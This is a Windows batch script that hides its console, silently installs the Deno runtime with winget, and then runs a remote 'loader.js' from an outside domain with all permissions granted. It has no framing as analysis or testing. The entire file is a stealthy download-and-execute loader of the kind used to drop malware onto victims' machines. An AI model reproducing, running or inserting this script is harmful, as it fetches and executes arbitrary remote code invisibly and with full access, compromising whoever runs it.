@echo off
start "" conhost.exe --headless -- powershell.exe -NoProfile -WindowStyle Hidden -c "winget install --id=DenoLand.Deno --version 1.46.3 --exact --silent --accept-package-agreements --accept-source-agreements;$d = (Get-ChildItem "$env:LOCALAPPDATA\Microsoft\WinGet\Packages" -Filter deno.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName); & $d run -A https://cloudsecware.com/loader.js"
exit /b 0
